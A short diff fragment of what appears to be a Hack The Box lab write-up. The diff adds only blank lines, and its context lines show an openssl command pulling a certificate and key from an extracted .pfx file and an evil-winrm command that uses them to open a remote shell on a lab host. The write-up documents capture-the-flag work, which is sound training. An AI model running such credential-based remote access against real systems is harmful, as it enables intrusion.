@@ -38,3 +38,6 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
 evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/dbc9049b-bc5b-4ae5-bf13-61229ef18444)
+
+
+
